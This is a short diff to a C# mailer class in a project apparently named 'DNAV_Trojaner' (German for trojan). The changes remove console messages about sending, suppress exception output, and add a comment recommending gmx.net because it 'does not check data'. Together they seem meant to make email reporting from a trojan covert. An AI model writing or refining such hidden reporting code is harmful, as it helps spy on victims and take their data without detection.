@@ -5,8 +5,8 @@ using System.Text;
 using System.Net.Mail;
 
 namespace DNAV_Trojaner {
-
-    //! Klappt immer noch nicht
+    //gmx.net Empfehlung, da diese Seite keine Daten prüft
+    //https://hilfe.gmx.net/pop-imap/einschalten.html
     class Mailer {
         public string toEmail;
         public string fromEmail;
@@ -39,12 +39,9 @@ namespace DNAV_Trojaner {
             SmtpServer.Port = port;
             SmtpServer.DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network;
             try {
-                //! FEHLER
                 SmtpServer.Send(mail);
-                Console.WriteLine("gesendet");
             } catch (Exception ex) {
-                Console.WriteLine("nicht gesendet");
-                Console.WriteLine(ex);
+                //Console.WriteLine(ex);
             }
         }
         public void send(string sub, string msg) { //? Nur Betreff&Text
